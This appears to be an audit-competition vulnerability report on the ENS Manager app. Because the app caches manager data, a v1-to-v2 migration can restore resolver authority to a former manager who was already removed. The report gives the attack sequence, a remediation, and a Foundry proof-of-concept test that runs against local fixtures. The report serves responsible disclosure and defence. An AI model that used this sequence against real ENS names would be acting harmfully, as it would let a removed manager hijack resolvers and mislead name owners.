# 90156 w a medium missing execution time manager validation restores a removed v1 manager and lets them hijack a migrated name s resolver

**Submitted on Aug 23rd 2026 at 11:33:23 UTC by @toucan256 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90156
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

ENS Manager builds a v1-to-v2 migration batch from ENSv1 data that React Query treats as fresh for five minutes. The batch grants `ROLE_SET_RESOLVER` to the manager captured in that snapshot, but the Manager app never revalidates the live ENSv1 registry manager before execution.

If registrant A removes manager B after the snapshot is fetched but before A confirms the normal migration flow, the official HCA batch still migrates the name to A and then restores B's resolver authority in ENSv2. B can subsequently call `PermissionedRegistry.setResolver` and replace the migrated name's resolver.

This matches the selected Critical websites/applications impact (ID 6286): a v1-to-v2 Manager migration assigns resolver control to an attacker. The attacker in this report is specifically a removed former manager; I do not claim arbitrary-outsider injection or direct asset theft.

## Vulnerability Details

### Root cause: stale authorization is consumed as execution authority

The audited Manager commit is:

`1c9b47f18fcddd2e864dfe385c4171061c9811ae`

The v1-name query is owner-scoped and considers its result fresh for five minutes:

```ts
resultQueryOptions({
  queryKey: qk('migration', 'v1_names', {
    address: address?.toLowerCase(),
  }),
  queryFn:
    enabled && address ? () => getV1NamesForAddress(address) : skipToken,
  staleTime: 5 * 60 * 1000,
})
```

During classification, the observed ENSv1 registry owner is retained as `classified.managerAddress`. The atomic batch builder later consumes that value without checking the live V1 registry again:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
  verificationExpectations.push({
    id: expectationId(name, 'manager-role'),
    type: 'manager-role',
    name,
    label: classified.label,
    registry: V2_CONTRACTS.ETHRegistry,
    resource: labelToCanonicalId(classified.label),
    account: classified.managerAddress,
    roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

`buildRoleGrantCall` encodes the stale address directly as the role recipient:

```ts
return {
  to: V2_CONTRACTS.ETHRegistry,
  data: encodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    functionName: 'grantRoles',
    args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
  }),
  value: 0n,
}
```

The same stale address is also placed into the post-state verification expectation. Therefore, successful restoration of B's authority is treated as the expected successful result rather than detected as authorization drift.

### Why the atomic transaction succeeds

For an unwrapped 2LD, the batch first calls `MigrationHelper.migrate` with A as the destination owner, then calls `PermissionedRegistry.grantRoles(resource, 1 << 24, B)`.

The exact HCA-aware contracts-v2 implementation tested is PR #402 head:

`5bbe6add1192c635215031e0b3f20d1e517959e5`

`MigrationHelper.migrate` resolves the current BaseRegistrar owner and verifies that the HCA owner is the owner or an approved operator. This correctly rejects BaseRegistrar ownership drift. However, it does not verify the current ENSv1 registry manager, and the subsequent role grant is authorized by the migrated owner/HCA. Consequently, manager-only drift is accepted: A can remain the registrant while B is removed as manager, yet B is restored by the stale second call.

### Minimal attack sequence

1. A is the BaseRegistrar registrant of `stale-manager.eth`; B is its current ENSv1 registry manager.
2. ENS Manager fetches the name and stores B as `managerAddress`.
3. A removes B with `BaseRegistrar.reclaim(tokenId, A)`. A remains the registration owner.
4. Before the five-minute query freshness interval expires, A confirms the normal Manager migration.
5. The HCA executes one ordered atomic batch:
   * `MigrationHelper.migrate(... owner: A ...)`
   * `PermissionedRegistry.grantRoles(resource, ROLE_SET_RESOLVER, B)`
6. The app's post-state check expects B to have that role, so the flow reports success.
7. B calls `PermissionedRegistry.setResolver(resource, attackerResolver)` and replaces the migrated name's resolver.

The registrant's confirmation is the ordinary migration action; it is not consent to re-authorize a manager that was explicitly removed after the snapshot.

## Impact Details

The protected asset is A's ENS name and its resolver control. Once B has been removed through the authoritative ENSv1 path, B is no longer authorized. Restoring `ROLE_SET_RESOLVER` lets B replace the resolver selected for the migrated name and thereby take control of how the name resolves, including address and content resolution handled by the replacement resolver.

The deterministic contract PoC proves all of the following:

* A remains the owner of the migrated ENSv2 name.
* B remains removed in ENSv1 before migration.
* The stale batch grants B `ROLE_SET_RESOLVER` in ENSv2.
* B successfully replaces the ENSv2 resolver.
* A control that omits the stale grant prevents B from replacing the resolver.
* A separate control shows BaseRegistrar ownership drift is rejected.

This is exactly the selected Critical impact's resolver-control case. The report does not claim ownership transfer, arbitrary outsider access, or a directly demonstrated theft of tokens/funds.

## Recommended remediation

Immediately before encoding or executing the manager-role grant, read the current ENSv1 registry owner and require it to equal the cached `managerAddress`. If it differs, either omit the role grant and rebuild the plan from fresh state, or abort and require the user to review the changed authorization state. Post-state verification must be derived from that live authorization result rather than the cached address.

## References

* ENS Audit Competition scope and impact 6286: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* Cached V1-name query: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23>
* Stale manager role grant and expectation: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624>
* Role-grant calldata: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26>
* Stale post-state verification: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts#L337-L353>
* HCA-aware contracts-v2 commit used by the PoC: <https://github.com/ensdomains/contracts-v2/commit/5bbe6add1192c635215031e0b3f20d1e517959e5>

## Proof of Concept

## Proof of Concept

### What the two layers prove

The audited Manager source deterministically emits the ordered calls `migrate(A)` and `grantRoles(ROLE_SET_RESOLVER, B)` from a classified name whose cached `managerAddress` is B. It also creates a post-state expectation that B has that role.

The Foundry test below executes those same calls against the exact contracts-v2 PR #402 implementation. It proves that manager-only drift is accepted and that removed manager B can replace the resolver. It includes two negative controls: omitting the stale grant blocks B, while changing the BaseRegistrar registrant causes the migration to revert.

### Steps to reproduce

1. Check out the exact contracts-v2 revision:

```bash
git clone --recurse-submodules https://github.com/ensdomains/contracts-v2.git
cd contracts-v2
git checkout 5bbe6add1192c635215031e0b3f20d1e517959e5
cd contracts
```

2. Save the test below as `contracts/test/poc/Candidate251.t.sol`.
3. Run:

```bash
forge test --match-path test/poc/Candidate251.t.sol --use 0.8.27 -vvv
```

4. Expected result: all three tests pass.

* `test_staleManagerIsRestoredAndCanReplaceResolver`: B is removed in ENSv1, receives the ENSv2 resolver role from the stale batch, and replaces the resolver.
* `test_liveManagerRecheckBlocksFormerManager`: without the stale role grant, B cannot replace the resolver.
* `test_registrantDriftIsRejected`: changing the BaseRegistrar owner causes `MigrationHelper.NotApprovedOperator`.

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.27;

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {Execution} from "nexus/types/DataTypes.sol";

import {IStandaloneHCAFactory} from "~src/hca/interfaces/IStandaloneHCAFactory.sol";
import {MigrationHelper, LockedChildren} from "~src/migration/MigrationHelper.sol";
import {UnlockedMigrationController} from "~src/migration/UnlockedMigrationController.sol";
import {LibMigration} from "~src/migration/libraries/LibMigration.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {MigrationControllerFixture} from "~test/fixtures/MigrationControllerFixture.sol";

/// @notice Minimal factory surface that certifies an HCA owner binding.
contract Candidate251Factory {
    mapping(address hca => address owner) internal _owners;

    /// @notice Certifies the owner associated with an HCA.
    function setAuthorizedOwner(address hca, address owner) external {
        _owners[hca] = owner;
    }

    /// @notice Returns the certified owner for an HCA.
    function authorizedOwnerOf(address hca) external view returns (address owner) {
        return _owners[hca];
    }
}

/// @notice Minimal owner-authenticated HCA that executes ordered calls atomically.
contract Candidate251HCA {
    address public immutable OWNER;

    /// @notice Reverts when the caller is not the configured owner.
    error CallerNotOwner();

    /// @param owner_ Account permitted to execute batches.
    constructor(address owner_) {
        OWNER = owner_;
    }

    /// @notice Executes an ordered batch with the HCA as each inner caller.
    function executeByOwner(Execution[] calldata executions) external payable {
        if (msg.sender != OWNER) {
            revert CallerNotOwner();
        }
        for (uint256 i; i < executions.length; ++i) {
            Execution calldata execution = executions[i];
            (bool success, bytes memory result) = execution.target.call{value: execution.value}(execution.callData);
            if (!success) {
                assembly ("memory-safe") {
                    revert(add(result, 32), mload(result))
                }
            }
        }
    }
}

/// @notice Deterministic proof for stale ENSv1 manager restoration during HCA migration.
contract Candidate251Test is MigrationControllerFixture {
    UnlockedMigrationController internal unlockedController;
    Candidate251Factory internal hcaFactory;
    Candidate251HCA internal hca;
    MigrationHelper internal helper;

    address internal formerManager = makeAddr("former-manager");
    address internal replacementRegistrant = makeAddr("replacement-registrant");
    address internal attackerResolver = makeAddr("attacker-resolver");

    function setUp() external {
        deployMigrationControllerFixture();

        unlockedController =
            new UnlockedMigrationController(nameWrapper, address(graveyard), ethRegistry, contractNamer);
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTER_RESERVED, address(unlockedController));

        hcaFactory = new Candidate251Factory();
        hca = new Candidate251HCA(testOwner);
        hcaFactory.setAuthorizedOwner(address(hca), testOwner);

        helper = new MigrationHelper(
            rootRegistry,
            unlockedController,
            unlockedController,
            IStandaloneHCAFactory(address(hcaFactory)),
            contractNamer
        );
    }

    /// @notice A removed ENSv1 manager is restored in ENSv2 by the stale atomic plan.
    function test_staleManagerIsRestoredAndCanReplaceResolver() external {
        (bytes memory name, uint256 tokenId, bytes32 node) = _registerThenRemoveFormerManager("stale-manager");

        _approveMigrationPath();
        vm.warp(block.timestamp + 299);

        Execution[] memory executions = new Execution[](2);
        executions[0] = _migrationExecution(name);
        executions[1] = _managerGrantExecution(tokenId, formerManager);

        vm.prank(testOwner);
        hca.executeByOwner(executions);

        assertEq(ethRegistry.getOwner(tokenId), testOwner, "registrant must own migrated name");
        assertTrue(
            ethRegistry.hasRoles(tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, formerManager),
            "stale former manager must receive resolver role"
        );
        assertNotEq(registryV1.owner(node), formerManager, "former manager must remain removed in v1");

        vm.prank(formerManager);
        ethRegistry.setResolver(tokenId, attackerResolver);
        assertEq(
            ethRegistry.getResolver("stale-manager"), attackerResolver, "restored manager must control the v2 resolver"
        );
    }

    /// @notice Omitting the stale grant prevents the removed manager from changing the resolver.
    function test_liveManagerRecheckBlocksFormerManager() external {
        (bytes memory name, uint256 tokenId,) = _registerThenRemoveFormerManager("live-manager");

        _approveMigrationPath();

        Execution[] memory executions = new Execution[](1);
        executions[0] = _migrationExecution(name);

        vm.prank(testOwner);
        hca.executeByOwner(executions);

        assertFalse(
            ethRegistry.hasRoles(tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, formerManager),
            "former manager must not receive resolver role"
        );
        vm.expectRevert();
        vm.prank(formerManager);
        ethRegistry.setResolver(tokenId, attackerResolver);
    }

    /// @notice BaseRegistrar ownership drift remains blocked even though manager-only drift is accepted.
    function test_registrantDriftIsRejected() external {
        (bytes memory name, uint256 tokenId) = registerUnwrapped("owner-drift");

        vm.prank(testOwner);
        baseRegistrar.setApprovalForAll(address(helper), true);
        vm.prank(testOwner);
        baseRegistrar.transferFrom(testOwner, replacementRegistrant, tokenId);

        Execution[] memory executions = new Execution[](1);
        executions[0] = _migrationExecution(name);

        vm.expectRevert(
            abi.encodeWithSelector(MigrationHelper.NotApprovedOperator.selector, baseRegistrar, replacementRegistrant)
        );
        vm.prank(testOwner);
        hca.executeByOwner(executions);
    }

    function _registerThenRemoveFormerManager(string memory label)
        internal
        returns (bytes memory name, uint256 tokenId, bytes32 node)
    {
        (name, tokenId) = registerUnwrapped(label);
        node = NameCoder.namehash(name, 0);

        vm.prank(testOwner);
        registryV1.setOwner(node, formerManager);
        assertEq(registryV1.owner(node), formerManager, "manager must be observable by the app");
        assertEq(baseRegistrar.ownerOf(tokenId), testOwner, "registrant must remain unchanged");

        vm.prank(testOwner);
        baseRegistrar.reclaim(tokenId, testOwner);
        assertEq(registryV1.owner(node), testOwner, "former manager must be removed before migration");
        assertEq(baseRegistrar.ownerOf(tokenId), testOwner, "manager removal must not change registrant");
    }

    function _approveMigrationPath() internal {
        vm.prank(testOwner);
        baseRegistrar.setApprovalForAll(address(helper), true);
        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(address(hca), true);
    }

    function _migrationExecution(bytes memory name) internal view returns (Execution memory execution) {
        LibMigration.Data[] memory unwrapped = new LibMigration.Data[](1);
        unwrapped[0] = _unlockedData(name);
        execution = Execution({
            target: address(helper),
            value: 0,
            callData: abi.encodeCall(
                MigrationHelper.migrate,
                (unwrapped, new LibMigration.Data[][](0), new LibMigration.Data[][](0), new LockedChildren[](0))
            )
        });
    }

    function _managerGrantExecution(uint256 tokenId, address manager)
        internal
        view
        returns (Execution memory execution)
    {
        execution = Execution({
            target: address(ethRegistry),
            value: 0,
            callData: abi.encodeCall(ethRegistry.grantRoles, (tokenId, RegistryRolesLib.ROLE_SET_RESOLVER, manager))
        });
    }
}
```

### Expected security-relevant post-state

After the positive test's atomic batch:

```
ENSv1 registry owner:        A (B remains removed)
BaseRegistrar / V2 owner:    A
V2 ROLE_SET_RESOLVER holder: B
V2 resolver after B's call:  attackerResolver
```

This demonstrates resolver-control restoration to the removed former manager without relying on a live-chain transaction or modifying production state.
